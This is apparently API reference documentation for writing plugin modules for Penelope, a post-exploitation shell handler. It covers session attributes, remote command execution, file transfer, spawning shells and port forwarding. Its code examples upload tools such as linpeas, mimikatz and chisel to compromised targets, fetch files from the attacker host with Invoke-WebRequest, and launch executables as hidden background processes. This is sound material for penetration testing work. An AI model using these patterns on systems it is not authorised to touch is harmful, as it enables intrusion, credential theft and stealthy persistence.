# Module API Reference

Modules are standard Python files. Each file defines one class that subclasses `penelope.Module`. The class name becomes the command name used in `run <name>`.

## Minimal Example

```python
import penelope

class my_module(penelope.Module):
    category = "Misc"

    def run(session, args):
        """One-line description shown in the module listing."""
        output = session.exec("id", value=True)
        penelope.logger.info(output)
```

---

## Class Attributes

```python
category         = "Misc"     # Group label in the module listing. Any string.
enabled          = True       # Set False to hide and disable without deleting the file.
os_filter        = None       # 'Unix' | 'Windows' | None
                              # Hides the module from the listing when the session OS
                              # does not match. None means show on all sessions.
on_session_start = False      # Call run(session, None) when a new session is established.
on_first_attach  = False      # Call run(session, None) on the first interactive attach.
on_session_end   = False      # Call run(session, None) when a session is about to close.
```

When a module is triggered by a hook, `args` is `None`. Always check before parsing.

---

## Session Attributes

### Identity

| Attribute | Type | Description |
|---|---|---|
| `session.id` | int | Unique session ID |
| `session.name` | str | Display name, e.g. `hostname~ip-system` |
| `session.name_colored` | str | Same with ANSI colour codes |
| `session.user` | str | Remote user, e.g. `www-data(33)` |
| `session.shell_pid` | str | Remote shell PID |
| `session.tty` | str | Remote TTY, e.g. `/dev/pts/0` (Unix only) |

### Network

| Attribute | Type | Description |
|---|---|---|
| `session.ip` | str | Remote IP address |
| `session.port` | int | Remote port of the initial connection |
| `session._host` | str | Attacker-side listener IP |
| `session._port` | int | Attacker-side listener port |
| `session.source` | str | `'reverse'` or `'bind'` |
| `session.listener` | TCPListener or None | None for bind shells |
| `session.latency` | float or None | Connection latency in seconds |

### System Info

| Attribute | Type | Description |
|---|---|---|
| `session.OS` | str | `'Unix'` or `'Windows'` |
| `session.hostname` | str | Remote hostname |
| `session.arch` | str | e.g. `x86_64` (Unix) or `x64-based_PC` (Windows) |
| `session.system` | str | OS version string |
| `session.cwd` | str | Current remote working directory (queried once per attach) |
| `session.tmp` | str or False | Writable remote temp directory; `False` if none found |
| `session.win_version` | str or None | Windows version string, e.g. `10.0.19045` |
| `session.systeminfo` | str or None | Raw `systeminfo` output (Windows only) |

### Shell State

| Attribute | Type | Description |
|---|---|---|
| `session.type` | str | `'Raw'`, `'PTY'`, or `'Readline'` |
| `session.subtype` | str or None | `'cmd'` or `'psh'` for Windows sessions, else None |
| `session.interactive` | bool | Shell presents a prompt |
| `session.echoing` | bool | Shell echoes input |
| `session.agent` | bool | Python agent deployed (enables agent-only features) |
| `session.pty_ready` | bool | Shell has a PTY |
| `session.can_deploy_agent` | bool | Remote Python available and agent not yet deployed |
| `session.new` | bool | Session not yet upgraded or attached |
| `session.is_attached` | bool | Currently the active interactive session |
| `session.prompt` | bytes | Last captured shell prompt |

### Binaries (Unix)

`session.bin` is a dict mapping binary name to its absolute remote path. Empty string if not present.

```python
if session.bin['bash']:
    session.exec(f"{session.bin['bash']} -c '...'", value=True)
```

Keys: `sh`, `bash`, `python`, `python3`, `uname`, `script`, `socat`, `tty`, `echo`, `base64`, `wget`, `curl`, `tar`, `rm`, `stty`, `setsid`, `find`, `nc`

### Storage

| Attribute | Type | Description |
|---|---|---|
| `session.directory` | Path | `~/.penelope/sessions/<name>/` |
| `session.logpath` | Path | Per-session log file |
| `session.uploaded_paths` | dict | `{remote_path: unix_timestamp}` of all uploads this session |
| `session.tasks` | dict | Active background tasks, keys: `portfwd`, `scripts` |

---

## Session Methods

### exec

```python
session.exec(cmd, value=False, timeout=False, raw=False, force_cmd=False)
```

Run a command on the remote shell.

| Parameter | Description |
|---|---|
| `value=True` | Wait and return stdout+stderr as a stripped string |
| `value=False` | Fire and forget, returns True on success |
| `timeout=N` | Override timeout in seconds |
| `raw=True` | No delimiter tokens, returns raw bytes. Use when output is noisy |
| `force_cmd=True` | Execute via `cmd.exe` even in a PowerShell session |

Agent-only parameters (requires `session.agent == True`):

| Parameter | Description |
|---|---|
| `python=True` | Execute as Python code inside the remote agent |
| `stdin_src=<file-like>` | Pipe data into remote stdin |
| `stdout_dst=<file-like>` | Stream remote stdout to a local file or socket |
| `stderr_dst=<file-like>` | Stream remote stderr to a local file or socket |

### upload

```python
session.upload(local_items, remote_path=None, randomize_fname=False, url_to_bytes_fn=None)
```

Upload files to the remote. `local_items` is a space-separated string of local paths, globs, or URLs. Returns a list of quoted remote path strings.

| Parameter | Description |
|---|---|
| `remote_path=None` | Upload to `session.cwd` if not set |
| `randomize_fname=True` | Append random suffix to avoid collisions |
| `url_to_bytes_fn=fn` | Override URL fetch and extraction. Signature: `fn(url) -> (filename, bytes)`. Useful for pulling a single file out of an archive. |

```python
# Upload a URL directly
session.upload(penelope.URLS['linpeas'], remote_path=session.tmp)

# Extract a specific binary from a zip
import zipfile, io
def extract(url):
    data = penelope.url_to_bytes(url)[1]
    with zipfile.ZipFile(io.BytesIO(data)) as z:
        return 'agent.exe', z.read('agent.exe')

session.upload(url, url_to_bytes_fn=extract, remote_path=session.tmp)
```

### download

```python
session.download(remote_items)
```

Download files or globs from the remote. Files land in `session.directory/downloads/`. Returns a list of local Path objects.

### spawn

```python
session.spawn(port=None, host=None)
```

Spawn a new shell back to penelope.

```python
session.spawn()           # use current listener
session.spawn(4444)       # new listener on port 4444
session.spawn(4444, '10.10.10.1')  # specific host and port
```

### write_access

```python
session.write_access(path) -> bool | None
```

Returns `True` if the path is writable on the remote, `False` if denied, `None` on error.

### upgrade

```python
session.upgrade() -> bool
```

Attempt to upgrade the shell: Raw -> PTY -> Python agent.

### script (agent only)

```python
session.script(local_script) -> Path | False
```

Run a local script on the remote via the agent. Script must have a valid shebang. Output is tailed in a new terminal window automatically.

### portfwd (agent only)

```python
session.portfwd(_type, lhost, lport, rhost, rport)
```

Set up port forwarding through the agent.

| `_type` | Direction |
|---|---|
| `'L'` | Local forward: `lhost:lport` -> `rhost:rport` on remote |
| `'R'` | Remote forward: `rhost:rport` -> `lhost:lport` on local |

### Other

```python
session.need_binary(name, url)  # interactive prompt to locate or upload a binary
session.kill()                  # close the session, triggers on_session_end hooks
session.attach()                # attach the interactive terminal to this session
session.detach()                # detach from this session
session.sync_cwd()              # resync session.cwd with the actual remote directory
```

---

## Penelope Globals

### Logger

```python
penelope.logger.info("done")       # [+] green
penelope.logger.warning("odd")     # [!] yellow
penelope.logger.error("failed")    # [-] red
penelope.logger.trace("detail")    # [*] cyan
penelope.logger.debug("low level") # shown only in debug mode
penelope.logger.critical("bad")    # [!!!] bold red
```

### Paint (coloured output)

```python
print(penelope.paint("text").green)
print(penelope.paint("text").red_BLUE)   # red text on blue background
```

Foreground colours: `black red green yellow blue magenta cyan orange white lightgrey darkgrey`

Background colours (uppercase): `BLACK RED GREEN YELLOW BLUE MAGENTA CYAN WHITE`

Style codes: `BRIGHT DIM UNDERLINE BLINK NORMAL`

Combine with underscore: `paint("text").white_BLUE`

### Interactive Prompt

```python
answer = penelope.ask("Enter target port: ")  # prints [?] in yellow, returns str
```

### Session Registry

```python
penelope.core.sessions          # dict {id: Session}
penelope.core.hosts             # dict {name: [Session, ...]}
penelope.core.listeners         # dict {id: TCPListener}
penelope.core.attached_session  # currently interactive session or None
```

### Built-in Tool URLs

```python
penelope.URLS['linpeas']
penelope.URLS['winpeas_bat']
penelope.URLS['pspy64']
penelope.URLS['chisel_amd64']
penelope.URLS['ligolo_amd64']
penelope.URLS['mimikatz']
# ... and more
```

```python
session.upload(penelope.URLS['linpeas'], remote_path=session.tmp)
```

### Options

```python
penelope.options.short_timeout    # int, command timeout in seconds (default 4)
penelope.options.long_timeout     # int, long operation timeout (default 60)
penelope.options.upload_chunk_size  # int, bytes per upload chunk
penelope.options.no_log           # bool
penelope.options.debug            # bool
```

---

## Common Patterns

### Guard against hook calls

```python
def run(session, args):
    if args is None:
        return  # triggered by hook, not user
```

### Guard on OS

```python
def run(session, args):
    if session.OS != 'Unix':
        penelope.logger.error("Unix only")
        return
```

### Check for writable temp dir

```python
def run(session, args):
    if not session.tmp:
        penelope.logger.error("No writable temp directory on target")
        return
```

### Serve a file via HTTP and download with IWR (Windows)

```python
import socket, threading, http.server, tempfile, shutil, os

sock = socket.socket()
sock.bind(('', 0))
port = sock.getsockname()[1]
sock.close()

tmpdir = tempfile.mkdtemp()
shutil.copy2('/path/to/file.exe', os.path.join(tmpdir, 'file.exe'))

class _H(http.server.SimpleHTTPRequestHandler):
    def log_message(self, *a): pass
    def __init__(self, *a, **kw): super().__init__(*a, directory=tmpdir, **kw)

httpd = http.server.HTTPServer(('', port), _H)
threading.Thread(target=httpd.serve_forever, daemon=True).start()

url = f"http://{session._host}:{port}/file.exe"
dest = f"{session.tmp}\\file.exe"
session.exec(f'Invoke-WebRequest -Uri "{url}" -OutFile "{dest}" -UseBasicParsing', value=True, timeout=30)

httpd.shutdown()
shutil.rmtree(tmpdir, ignore_errors=True)
```

### Background execution on Windows

```python
# PSH session
session.exec(f'Start-Process -FilePath "{remote_exe}" -ArgumentList "{arg}" -WindowStyle Hidden', value=False)

# CMD session
session.exec(f'start /b "" "{remote_exe}" "{arg}"', force_cmd=True, value=False)

# Either, branched on subtype
if session.subtype == 'psh':
    session.exec(f'Start-Process ...', value=False)
else:
    session.exec(f'start /b "" ...', force_cmd=True, value=False)
```
